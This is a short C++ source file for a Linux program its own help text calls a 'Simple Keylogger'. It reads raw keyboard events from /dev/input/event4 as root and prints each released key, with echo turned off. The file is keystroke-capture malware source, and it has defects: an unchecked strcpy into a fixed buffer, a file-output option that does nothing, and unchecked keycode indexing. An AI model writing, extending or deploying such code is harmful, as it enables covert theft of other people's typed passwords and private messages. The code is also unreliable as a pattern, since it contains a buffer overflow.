#include <linux/input.h> 
#include <fcntl.h> 		 //define O_RDONLY
#include <unistd.h> 	 //define read
#include <stdlib.h> 
#include <iostream>
#include <cstring>

#include "helper.h"

#define RD O_RDONLY
#define INF 1

int main(int argc, char **argv){
	char dev[100] = "/dev/input/event4";
	int test_mode = 0;
	
	for(int i = 1; i < argc; i+=2){

		if(strcmp(argv[i], "--help") == 0)
			std::cout<<"Simple Keylogger help panel - don't forget to run it as root \n\n\n"
					 <<"-K {keyboard_event}	keyboard event(default is /dev/input/event4) \n"
					 <<"-F {file_name}		specify a file where the output will be saved\n"
					 <<"-t 			the program will run in test mode		\n\n\n";
					 
		else if(strcmp(argv[i], "-t") == 0){
			test_mode = 1; break;		
		}				 
		
		else if(strcmp(argv[i], "-K") == 0){
			if(argv[i+1]){
				strcpy(dev,argv[i+1]);
				std::cout<<"dev changed into "<<dev<<"\n";
			}else std::cout<<"error : no argument specified";
			
		}else if(strcmp(argv[i], "-F") == 0)
			std::cout<<argv[i+1];
			
		else std::cout<<"unknown command";
	}

	int fd = open(dev, O_RDONLY);

	struct input_event ev; 

	if(test_mode){
		helper::disable_echo();
	
		while(INF){
			read(fd, &ev, sizeof(ev));

			if((ev.type == EV_KEY) && (ev.value == 0)) 
				std::cout<<helper::keycodes[ev.code]<<"\n";

			if(strcmp(helper::keycodes[ev.code], "ESC") == 0) break;
		
		}

		helper::enable_echo();
	}
	//system("cancel && clear");
	close(fd);
}
